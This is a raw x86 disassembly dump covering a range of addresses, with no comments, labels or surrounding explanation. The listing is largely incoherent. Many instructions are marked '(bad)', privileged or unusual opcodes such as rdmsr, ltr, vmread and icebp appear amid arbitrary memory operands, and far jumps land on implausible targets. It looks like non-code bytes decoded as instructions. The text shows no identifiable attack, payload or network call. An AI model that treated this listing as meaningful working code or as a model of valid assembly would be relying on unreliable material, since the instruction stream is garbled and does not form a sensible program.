  431334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431335:	pop    es
  431336:	inc    ecx
  431337:	(bad)  
  431338:	data16 fwait
  43133a:	inc    ebp
  43133b:	xor    ah,BYTE PTR [esi+0x3]
  43133e:	dec    ebp
  43133f:	push   eax
  431340:	inc    bp
  431342:	jge    0x4312c7
  431344:	mov    esp,DWORD PTR [esi-0x18]
  431347:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43134d:	add    DWORD PTR [ebx],esi
  43134f:	add    BYTE PTR [ebx],al
  431351:	test   DWORD PTR [ebx],esi
  431353:	(bad)  
  431354:	inc    WORD PTR [ebp+0x0]
  431358:	mov    eax,DWORD PTR [eax]
  43135a:	call   0x8898ca8f
  43135f:	mov    esi,eax
  431361:	clc    
  431362:	ret    
  431363:	rol    cl,0xa
  431366:	mov    DWORD PTR ds:0x7c0ec88,esi
  43136c:	mov    edx,edi
  43136e:	pushf  
  43136f:	pop    es
  431370:	jmp    FWORD PTR [edx+0x66]
  431373:	add    BYTE PTR [ebp-0x990175],al
  431379:	inc    ebp
  43137a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431380:	push   ebp
  431381:	mov    edi,eax
  431383:	mov    dh,BYTE PTR [eax+0x266ff51]
  431389:	push   ebp
  43138a:	add    BYTE PTR [ebx-0x764b0777],al
  431390:	dec    DWORD PTR [esi+0x661851e8]
  431396:	add    BYTE PTR [ebp-0x7b],dl
  431399:	cmp    esi,0xfffffffb
  43139c:	dec    DWORD PTR [ecx+0x51fe9285]
  4313a2:	jmp    DWORD PTR [esi-0x75]
  4313a5:	push   ebp
  4313a6:	hlt    
  4313a7:	data16 (bad) 
  4313a9:	dec    ebp
  4313aa:	ret    
  4313ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313b1:	lea    edx,[eax-0x1]
  4313b4:	jne    0x431387
  4313b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313bc:	dec    BYTE PTR [ecx+0x51559eff]
  4313c2:	mov    DWORD PTR [esi-0x4c],esp
  4313c5:	push   ebp
  4313c6:	jmp    DWORD PTR [esi-0x18]
  4313c9:	inc    ebp
  4313ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313d0:	(bad)  
  4313d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313d2:	inc    eax
  4313d4:	test   DWORD PTR [esi-0x2],esp
  4313d7:	inc    ebp
  4313d8:	dec    DWORD PTR [ebp-0x760bde75]
  4313de:	(bad)  
  4313df:	test   al,0xc3
  4313e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313e7:	lods   al,BYTE PTR ds:[esi]
  4313e8:	push   eax
  4313e9:	inc    ebp
  4313ea:	jne    0x4313fb
  4313ec:	dec    DWORD PTR [ebp+0x8]
  4313ef:	mov    ecx,DWORD PTR [ebx]
  4313f1:	sbb    al,0x0
  4313f3:	(bad)  
  4313f4:	mov    eax,0xc14fc3
  4313f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4313ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431403:	xor    eax,DWORD PTR [eax]
  431405:	add    eax,edi
  431407:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43140d:	xor    edi,DWORD PTR [eax+0x854f66]
  431413:	dec    BYTE PTR [ecx-0x76bb01]
  431419:	mov    BYTE PTR [ebx-0x76724001],al
  43141f:	pushf  
  431420:	inc    esi
  431421:	(bad)  
  431422:	dec    DWORD PTR [ebp-0x7abe6373]
  431428:	sar    esi,0x89
  43142b:	dec    DWORD PTR [eax+0x0]
  43142e:	inc    DWORD PTR [eax]
  431430:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431437:	xlat   BYTE PTR ds:[ebx]
  431438:	dec    edx
  431439:	add    bh,bh
  43143b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431441:	lea    esp,[esi-0x50]
  431444:	(bad)  
  431445:	(bad)  
  431446:	call   DWORD PTR [eax-0x1]
  431449:	inc    ebp
  43144a:	rdpmc  
  43144c:	add    BYTE PTR [ebx],al
  43144e:	push   ax
  431450:	lea    eax,[ebp-0x1]
  431456:	js     0x431457
  431458:	add    al,bh
  43145a:	push   bp
  43145c:	lea    ecx,[ebp-0x7701]
  431462:	fmul   DWORD PTR [ebp-0x7a997800]
  431468:	(bad)  
  431469:	(bad)  
  43146a:	(bad)  
  43146b:	(bad)  
  43146c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431472:	dec    eax
  431473:	mov    eax,0x8d8dffff
  431478:	mov    al,0xb0
  43147a:	(bad)  
  43147b:	call   DWORD PTR [ecx+0x50]
  43147e:	dec    ebp
  43147f:	inc    ebp
  431480:	mov    esi,0x7030833
  431485:	push   eax
  431486:	into   
  431487:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43148d:	call   DWORD PTR [ecx-0x8]
  431490:	lea    edx,[ebp-0x1]
  431493:	jmp    0x761697
  431498:	inc    eax
  431499:	jnp    0x431428
  43149b:	add    dh,bh
  43149d:	inc    WORD PTR [ebp-0x8a00b0]
  4314a4:	mov    edx,eax
  4314a6:	inc    esp
  4314a7:	add    bh,bh
  4314a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314af:	dec    DWORD PTR [ebx-0x7f820301]
  4314b5:	add    BYTE PTR [ecx],al
  4314b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4314be:	inc    eax
  4314c0:	(bad)  
  4314c1:	dec    si
  4314c3:	test   edi,edi
  4314c5:	(bad)  
  4314c6:	cmp    edi,edi
  4314c8:	add    ecx,DWORD PTR [edi-0x39]
  4314cb:	mov    edx,DWORD PTR [edx+0x66]
  4314ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4314d4:	mov    eax,0x66ff8b5e
  4314da:	jmp    0xb4ff:0xc7ff3895
  4314e1:	push   ecx
  4314e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314e8:	call   DWORD PTR [esi-0x1]
  4314eb:	dec    DWORD PTR [eax]
  4314ed:	mov    ecx,0x805ff
  4314f2:	inc    ebp
  4314f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4314f9:	mov    ecx,0x35784
  4314fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431504:	inc    ebp
  431505:	mov    ecx,0x9c6131
  43150a:	(bad)  
  43150b:	mov    eax,ebx
  43150d:	pop    esp
  43150e:	test   edi,edi
  431510:	clc    
  431511:	lea    eax,[ebp-0x24]
  431514:	cmp    eax,0xc7fe9c8d
  431519:	push   eax
  43151b:	lea    eax,[ebp+0x45fff8fe]
  431521:	mov    esi,DWORD PTR [ecx]
  431523:	hlt    
  431524:	lahf   
  431525:	push   esp
  431526:	mov    edx,DWORD PTR [ecx-0x4]
  431529:	xor    eax,DWORD PTR [eax+0x7201bb]
  43152f:	add    BYTE PTR [ebp-0x35],al
  431532:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431538:	mov    edx,DWORD PTR [ecx-0x74]
  43153b:	rol    BYTE PTR [eax],0x8d
  43153e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431542:	nop
  431543:	push   ecx
  431544:	add    bh,bh
  431546:	mov    esp,edi
  431548:	in     al,0x85
  43154a:	jge    0x43154a
  43154c:	test   edi,edi
  43154e:	jne    0x4314d5
  431550:	(bad)  
  431551:	(bad)  
  431552:	sbb    bh,bh
  431554:	push   ebp
  431555:	inc    ebp
  431556:	call   0xffdc0fe6
  43155b:	add    BYTE PTR [ebp+0x66],al
  43155e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431564:	cmp    al,0x85
  431566:	ud0    eax,DWORD PTR [ebp-0x1]
  43156a:	test   DWORD PTR [edi+0x74],ecx
  43156d:	dec    edi
  43156e:	inc    DWORD PTR [ebp-0x530004]
  431574:	dec    DWORD PTR [edi-0x75]
  431577:	dec    esi
  431578:	cld    
  431579:	test   DWORD PTR [eax+0xff01ff],eax
  43157f:	icebp  
  431580:	add    BYTE PTR [edi-0x3a],cl
  431583:	test   ebx,eax
  431585:	inc    BYTE PTR [ebp-0x1]
  431588:	jne    0x43158a
  43158a:	mov    eax,DWORD PTR [eax]
  43158c:	cld    
  43158d:	xor    BYTE PTR [ecx+0x500155],cl
  431593:	push   ebp
  431594:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43159a:	add    BYTE PTR [ebp+0x35e90f50],al
  4315a0:	add    al,BYTE PTR [eax]
  4315a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315a8:	add    ah,ch
  4315aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4315b0:	jmp    0xdf18a6
  4315b5:	(bad)  
  4315b6:	nop    ecx
  4315b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4315bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4315c2:	mov    eax,edi
  4315c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4315c7:	add    eax,0x45fef885
  4315cc:	dec    DWORD PTR [ebx+0x339445]
  4315d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315d8:	dec    DWORD PTR [ebx-0x460f0375]
  4315de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315df:	add    esi,edi
  4315e1:	add    bh,bh
  4315e3:	rdpmc  
  4315e5:	add    BYTE PTR [ebx],0x1
  4315e8:	mov    DWORD PTR [eax],eax
  4315ea:	add    al,0x45
  4315ec:	dec    DWORD PTR [ecx-0x360b3373]
  4315f2:	dec    DWORD PTR [esi]
  4315f4:	push   eax
  4315f5:	jne    0x43163c
  4315f7:	mov    esi,DWORD PTR [ebx]
  4315f9:	cld    
  4315fa:	add    esp,ecx
  4315fc:	push   eax
  4315fd:	inc    DWORD PTR [ebp-0x75]
  431600:	add    eax,0x800e4
  431605:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43160b:	mov    DWORD PTR [ecx],eax
  43160d:	sbb    al,0x0
  43160f:	leave  
  431610:	test   DWORD PTR [edi-0x2],eax
  431613:	jne    0x431614
  431615:	call   0xff44001a
  43161a:	xor    BYTE PTR [ebp+0x4d],al
  43161d:	mov    edi,edi
  43161f:	enter  0x8,0x4d
  431623:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431629:	mov    eax,DWORD PTR [eax]
  43162b:	cld    
  43162c:	add    DWORD PTR [ecx],ebx
  43162e:	inc    ebp
  43162f:	dec    ebp
  431630:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431636:	inc    eax
  431637:	dec    DWORD PTR [ecx-0x270375]
  43163d:	add    BYTE PTR [ebx-0x39d72701],cl
  431643:	xchg   ecx,eax
  431644:	ret    
  431645:	add    BYTE PTR [ebp-0x830075],al
  43164b:	add    BYTE PTR [ebp-0x75],al
  43164e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431654:	lea    edi,[edi-0xc]
  431657:	add    bh,bh
  431659:	mov    edx,DWORD PTR [eax-0x7b]
  43165c:	inc    ebp
  43165d:	rdpmc  
  43165f:	jne    0x431664
  431661:	add    BYTE PTR [eax-0x75],dl
  431664:	inc    ebp
  431665:	clc    
  431666:	add    eax,0x400009
  43166b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431671:	mov    eax,DWORD PTR [ecx]
  431673:	in     al,dx
  431674:	add    dh,al
  431676:	test   ebx,eax
  431678:	inc    BYTE PTR [ebp-0xff0001]
  43167e:	add    BYTE PTR [ebp-0x43],al
  431681:	cmp    esi,0xfffffff8
  431684:	(bad)  
  431685:	push   DWORD PTR [eax]
  431687:	add    BYTE PTR [ebp-0x3a],dl
  43168a:	test   ebx,eax
  43168c:	je     0x431613
  43168e:	mov    edi,edi
  431690:	sbb    al,0xff
  431692:	test   DWORD PTR gs:[eax],eax
  431695:	(bad)  
  431696:	js     0x431697
  431698:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43169e:	sub    eax,ebx
  4316a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316a6:	add    eax,DWORD PTR [eax]
  4316a8:	dec    ebp
  4316a9:	push   eax
  4316aa:	mov    al,BYTE PTR [ebp+0x1]
  4316ad:	mov    eax,DWORD PTR [ebp-0x68]
  4316b0:	mov    eax,DWORD PTR [eax]
  4316b2:	sbb    bh,al
  4316b4:	or     ah,dh
  4316b6:	dec    ebp
  4316b7:	inc    DWORD PTR [eax+0x4]
  4316ba:	push   ecx
  4316bb:	add    BYTE PTR [edx-0x1],dh
  4316be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316d4:	push   ecx
  4316d5:	cmp    BYTE PTR [ebx],al
  4316d7:	inc    ebp
  4316d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316de:	(bad)  
  4316df:	(bad)  
  4316e0:	in     al,0xff
  4316e2:	add    BYTE PTR [ebp+0x0],al
  4316e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316eb:	add    al,bh
  4316ed:	(bad)  
  4316ee:	jmp    0x8d85:0x74b0558d
  4316f5:	dec    DWORD PTR [eax]
  4316f7:	call   DWORD PTR [ebp-0x7b]
  4316fa:	mov    edi,esi
  4316fc:	lock call DWORD PTR [ebp-0x75]
  431700:	mov    esi,esp
  431702:	mov    ah,0xc6
  431704:	mov    bh,0xc3
  431706:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43170c:	add    DWORD PTR [eax],0x450050ff
  431712:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431718:	inc    edi
  43171a:	push   esp
  43171c:	jmp    0xcd00:0x650481ff
  431723:	mov    DWORD PTR [ebx],esi
  431725:	clc    
  431726:	cmp    edi,0xff9cff3c
  43172c:	jne    0x431736
  43172e:	mov    eax,eax
  431730:	add    esi,DWORD PTR [eax]
  431732:	int3   
  431733:	inc    ebp
  431734:	cmp    al,0x83
  431736:	add    BYTE PTR [eax],bl
  431738:	adc    DWORD PTR [ebx+0x768b5055],eax
  43173e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431744:	mov    edi,eax
  431746:	cmp    BYTE PTR [ebp+0x45],cl
  431749:	jmp    0x4316d6
  43174b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43174e:	inc    ebp
  43174f:	or     al,0x2
  431751:	dec    DWORD PTR [ebp+0x18]
  431754:	jne    0x4317ab
  431756:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43175c:	mov    edi,DWORD PTR [ebx]
  43175e:	in     al,0x50
  431760:	xchg   ecx,eax
  431761:	jmp    0x3436666
  431766:	adc    al,0x8b
  431768:	inc    ebp
  431769:	mov    al,ds:0x8b04008b
  43176e:	push   ebp
  43176f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431775:	push   ebp
  431776:	test   DWORD PTR [ebx-0x2800d701],ecx
  43177c:	inc    ebp
  43177d:	dec    ebp
  43177e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431784:	mov    DWORD PTR [eax],0xe9ff00f4
  43178a:	add    al,0x0
  43178c:	add    BYTE PTR [eax],al
  43178e:	mov    eax,edx
  431790:	push   eax
  431791:	rol    DWORD PTR [ebp-0xf0177],1
  431797:	bound  eax,QWORD PTR [ebp+0x50]
  43179a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317a6:	mov    al,0xf
  4317a8:	test   DWORD PTR [edx],edx
  4317aa:	call   DWORD PTR [ebp-0x7a0001]
  4317b0:	(bad)  
  4317b1:	loop   0x4317b2
  4317b3:	jnp    0xc6990bb9
  4317b9:	mov    eax,ebx
  4317bb:	cmp    al,0x8b
  4317bd:	(bad)  
  4317be:	cld    
  4317bf:	shr    esi,0xc
  4317c2:	add    dl,al
  4317c4:	push   eax
  4317c5:	lea    eax,[ebp-0x1]
  4317c8:	mov    edx,esi
  4317ca:	cwde   
  4317cb:	cli    
  4317cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317d2:	or     BYTE PTR [eax],cl
  4317d4:	inc    ebp
  4317d5:	dec    ebp
  4317d6:	inc    DWORD PTR [ebx+0x74803914]
  4317dc:	add    DWORD PTR [ebx+0x451800],ecx
  4317e2:	call   DWORD PTR [eax+edx*1]
  4317e5:	add    ecx,DWORD PTR [ebp-0x34]
  4317e8:	push   edi
  4317e9:	adc    al,0x8
  4317eb:	mov    edx,DWORD PTR [ebp-0x14]
  4317ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4317f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4317f5:	inc    DWORD PTR [eax+esi*8]
  4317f8:	inc    ebp
  4317f9:	stos   BYTE PTR es:[edi],al
  4317fa:	mov    edx,DWORD PTR [ebp-0x4]
  4317fd:	add    DWORD PTR [ebp-0x1c],eax
  431800:	mov    edx,DWORD PTR [ebp-0x70]
  431803:	cmp    eax,DWORD PTR [eax]
  431805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431806:	mov    eax,DWORD PTR [eax]
  431808:	cld    
  431809:	jae    0x43178b
  43180b:	add    eax,DWORD PTR [ecx]
  43180d:	clc    
  43180e:	add    BYTE PTR [eax+0x30],dl
  431811:	mov    DWORD PTR [ecx],esi
  431813:	clc    
  431814:	pop    ds
  431815:	inc    ebp
  431816:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43181c:	(bad)  
  43181d:	push   DWORD PTR [edi]
  43181f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431825:	(bad)  
  431826:	jae    0x431827
  431828:	mov    eax,DWORD PTR [ebp-0x740175]
  43182e:	sub    eax,DWORD PTR [eax]
  431830:	add    eax,DWORD PTR [eax]
  431832:	mov    DWORD PTR [ecx+0x5f],eax
  431835:	mov    DWORD PTR [ebx-0x4],ebx
  431838:	ret    0xff
  43183b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431841:	ret    
  431842:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431848:	add    BYTE PTR [ebp-0x7d],al
  43184b:	mov    DWORD PTR [eax],eax
  43184d:	add    al,0x84
  43184f:	inc    DWORD PTR [ecx]
  431851:	lea    eax,[eax]
  431853:	hlt    
  431854:	sar    bh,cl
  431856:	test   BYTE PTR [eax+0x1],dl
  431859:	inc    ebp
  43185a:	add    BYTE PTR [ebx],dh
  43185c:	test   BYTE PTR [ebx],0x84
  43185f:	push   eax
  431860:	add    BYTE PTR [ebp+0x0],al
  431863:	add    eax,0x86
  431868:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43186e:	add    BYTE PTR [ecx],al
  431870:	add    BYTE PTR [eax],al
  431872:	mov    esi,0x550030
  431877:	mov    ecx,DWORD PTR [edi]
  431879:	cld    
  43187a:	fidiv  DWORD PTR [ebp+0x0]
  43187d:	mov    edi,DWORD PTR [ecx]
  43187f:	xor    BYTE PTR [eax+eax*1],0x84
  431883:	add    eax,DWORD PTR [eax]
  431885:	sbb    BYTE PTR [eax],al
  431887:	jne    0x43183a
  431889:	mov    eax,DWORD PTR [ecx]
  43188b:	sbb    BYTE PTR [eax],al
  43188d:	mov    DWORD PTR [ebp-0x1],esp
  431890:	add    BYTE PTR [eax+0x30e45ca],bh
  431896:	ret    0xb7fc
  431899:	dec    ebp
  43189a:	or     al,0x89
  43189c:	dec    ebp
  43189d:	cld    
  43189e:	cmovne ecx,DWORD PTR [eax-0x75]
  4318a2:	add    edi,esp
  4318a4:	seto   BYTE PTR [esi-0x72ffffff]
  4318ab:	inc    ebp
  4318ac:	adc    al,0x8b
  4318ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318b5:	cmp    DWORD PTR [edi+0x72],edx
  4318b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318be:	gs cmp al,0x0
  4318c1:	je     0x431899
  4318c3:	push   eax
  4318c4:	sar    BYTE PTR [eax],1
  4318c6:	mov    bh,0x3e
  4318c8:	push   cs
  4318c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318cf:	add    DWORD PTR [ecx+0x12],ebp
  4318d2:	dec    edx
  4318d3:	(bad)  
  4318d4:	mov    eax,edx
  4318d6:	in     al,dx
  4318d7:	adc    DWORD PTR [ecx],esi
  4318d9:	pop    esi
  4318da:	inc    ecx
  4318db:	leave  
  4318dc:	or     DWORD PTR [eax],ebx
  4318de:	gs push ebp
  4318e0:	add    ah,ch
  4318e2:	into   
  4318e3:	in     al,dx
  4318e4:	enter  0xb756,0xf0
  4318e8:	push   cs
  4318e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4318f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4318f9:	jnp    0x74439e01
  4318ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431905:	add    BYTE PTR [edi],cl
  431907:	mov    edi,DWORD PTR [ecx-0x78]
  43190a:	ltr    WORD PTR [ecx-0x7b]
  43190e:	dec    DWORD PTR [edi]
  431910:	clc    
  431911:	out    0x45,eax
  431913:	add    BYTE PTR [eax],cl
  431915:	cmp    ebx,0xffffff8c
  431918:	jge    0x43191a
  43191a:	jb     0x43192c
  43191c:	je     0x52199c
  431922:	pop    edx
  431923:	push   esi
  431924:	mov    ecx,DWORD PTR [edi]
  431926:	in     al,dx
  431927:	rol    DWORD PTR [ebp+0x0],1
  43192a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431931:	cmp    DWORD PTR [ecx],0xfffffff0
  431934:	hlt    
  431935:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43193b:	(bad)  
  43193d:	push   eax
  43193e:	jns    0xb842fdbc
  431944:	lock push cs
  431946:	ror    edx,0x3
  431949:	test   BYTE PTR [ecx+0x5500e800],cl
  43194f:	dec    eax
  431950:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431954:	(bad)  
  431955:	mov    esi,0x7f33ff5f
  43195a:	inc    eax
  43195b:	test   DWORD PTR [edx],eax
  43195d:	je     0x43191f
  43195f:	mov    ecx,ecx
  431961:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431965:	and    eax,DWORD PTR [eax+0xf0103]
  43196b:	jp     0x431959
  43196d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431971:	add    edx,DWORD PTR [edi+0x74]
  431974:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43197a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431980:	je     0x431905
  431982:	cmp    eax,edi
  431984:	js     0x4319a9
  431986:	add    eax,0xeb0fc003
  43198b:	jns    0x431918
  43198d:	vmread DWORD PTR [ecx+0x45],ebx
  431991:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431997:	adc    al,0x8b
  431999:	jge    0x4319af
  43199b:	mov    edi,DWORD PTR [eax-0x4]
  43199e:	add    edi,DWORD PTR [edi]
  4319a0:	or     bh,bh
  4319a2:	push   ebp
  4319a3:	push   es
  4319a4:	mov    DWORD PTR [ebp-0x4],ebx
  4319a7:	add    edi,esi
  4319a9:	pop    es
  4319aa:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319b0:	mov    DWORD PTR [esp+esi*8],ecx
  4319b3:	inc    ebp
  4319b4:	pop    ebp
  4319b5:	xor    DWORD PTR [esi-0x4],0x3b
  4319b9:	add    edx,DWORD PTR [ecx+edi*1]
  4319bc:	push   es
  4319bd:	clc    
  4319be:	mov    bh,0xdb
  4319c0:	jp     0x431979
  4319c2:	add    cl,BYTE PTR [esi]
  4319c4:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319ca:	test   edi,edi
  4319cc:	je     0x4319c2
  4319ce:	mov    eax,ecx
  4319d0:	or     BYTE PTR [ebx],al
  4319d2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319d8:	jbe    0x431a4c
  4319da:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319e0:	add    ecx,DWORD PTR [esi]
  4319e2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319e8:	add    eax,DWORD PTR [ebx-0x287af783]
  4319ee:	je     0x431a3d
  4319f0:	mov    DWORD PTR [ecx],edi
  4319f2:	mov    esi,eax
  4319f4:	hlt    
  4319f5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4319fc:	jb     0x4319be
  4319fe:	jmp    0x4319eb
  431a00:	xor    esi,DWORD PTR [ebx]
  431a02:	pop    edi
  431a03:	pop    esi
  431a04:	pop    ebx
  431a05:	ret    
  431a06:	ret    0x8b
  431a09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a0f:	xor    DWORD PTR [ecx],0xc
  431a12:	pushf  
  431a13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a19:	rdmsr  
  431a1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a22:	dec    ebp
  431a23:	ret    
  431a24:	mov    edi,DWORD PTR [esi-0x4]
  431a27:	pop    eax
  431a28:	dec    ebp
  431a29:	jne    0x4319b6
  431a2b:	xor    edi,esp
  431a2d:	inc    eax
  431a2e:	dec    ebp
  431a2f:	jbe    0x431a84
  431a31:	inc    eax
  431a32:	pop    ebp
  431a33:	add    edx,DWORD PTR [esi+0x8]
  431a36:	push   esp
  431a37:	dec    eax
  431a38:	push   ecx
  431a39:	mov    eax,edi
  431a3b:	and    al,0xf0
  431a3d:	jo     0x431a2a
  431a3f:	mov    eax,DWORD PTR [ebx]
  431a41:	sbb    BYTE PTR [ebp+0x4d],cl
  431a44:	mov    eax,DWORD PTR [ebx]
  431a46:	nop
  431a47:	or     BYTE PTR [eax],al
  431a49:	jne    0x431aa2
  431a4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a51:	cld    
  431a52:	xor    edi,edi
  431a54:	add    edi,DWORD PTR [ebp+0x3]
  431a57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a5d:	js     0x4319e3
  431a5f:	jae    0x431a63
  431a61:	(bad)  
  431a63:	xor    al,0x5d
  431a65:	jmp    0x4319f2
  431a67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a6e:	fdecstp 
  431a70:	test   BYTE PTR [edi],ah
  431a72:	add    bh,BYTE PTR [ebp+0x0]
  431a75:	add    ebx,DWORD PTR [ebp-0x77]
  431a78:	mov    edi,eax
  431a7a:	cmp    al,0x0
  431a7d:	adc    dh,BYTE PTR [ebx]
  431a7f:	jge    0x431a84
  431a81:	mov    edi,DWORD PTR [ebx]
  431a83:	jl     0x431a94
  431a85:	clc    
  431a86:	dec    edi
  431a87:	jge    0x431a89
  431a89:	mov    eax,DWORD PTR [ebx]
  431a8b:	jb     0x431a95
  431a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431a90:	mov    edi,edi
  431a92:	xor    edx,DWORD PTR [eax]
  431a94:	add    edi,DWORD PTR [ebx]
  431a96:	mov    DWORD PTR [ebp-0x10],edi
  431a99:	inc    edi
  431a9a:	pop    ebp
  431a9b:	jge    0x431ad8
  431a9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431aa1:	mov    edx,0xc05d87f0
  431aa6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aaa:	fimul  WORD PTR [eax]
  431aac:	fist   WORD PTR [ebp+0x1c]
  431aaf:	in     al,dx
  431ab0:	jne    0x431a9e
  431ab2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431ab8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431abc:	fdivp  st(0),st
  431abe:	fild   WORD PTR [ebp+0x4510f85c]
  431ac4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431aca:	inc    ebp
  431acb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ad1:	mov    ebp,DWORD PTR [ebx-0x4]
  431ad4:	adc    al,0x8b
  431ad6:	rcl    DWORD PTR [eax],0x48
  431ad9:	mov    esi,0x7080803
  431ade:	fiadd  WORD PTR [ebp+0x4d]
  431ae1:	(bad)  
  431ae2:	mov    edx,DWORD PTR [edx-0x4]
  431ae5:	mov    edx,DWORD PTR [ebp-0x4]
  431ae8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431aee:	mov    DWORD PTR [edi+0x872dc],edi
  431af4:	xlat   BYTE PTR ds:[ebx]
  431af5:	into   
  431af6:	ffreep st(6)
  431af8:	retf   0x6c7
  431afb:	iret   
  431afc:	dec    ebp
  431afd:	inc    ebp
  431afe:	mov    DWORD PTR [ebx],edi
  431b00:	fmul   QWORD PTR [edi]
  431b02:	dec    ebp
  431b03:	jnp    0x431b38
  431b05:	add    BYTE PTR [ebx],al
  431b07:	mov    ecx,DWORD PTR [esp+edi*8]
  431b0a:	inc    ebp
  431b0b:	dec    ebp
  431b0c:	lea    esi,[ebx]
  431b0e:	add    DWORD PTR [ebx],eax
  431b10:	jb     0x431b4d
  431b12:	add    BYTE PTR [edi],cl
  431b14:	inc    ebp
  431b15:	imul   eax,edi,0x858bd800
  431b1b:	cld    
  431b1c:	clc    
  431b1d:	mov    DWORD PTR [ebp+0x0],eax
  431b20:	inc    DWORD PTR [eax]
  431b22:	or     al,0xde
  431b24:	sbb    bh,0x1
  431b27:	retf   
  431b28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b2f:	dec    ebp
  431b30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b36:	enter  0x12de,0xdf
  431b3a:	inc    ebp
  431b3b:	pop    ebp
  431b3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b42:	add    DWORD PTR [edx],edx
  431b44:	add    BYTE PTR [ebp+0x50],dl
  431b47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
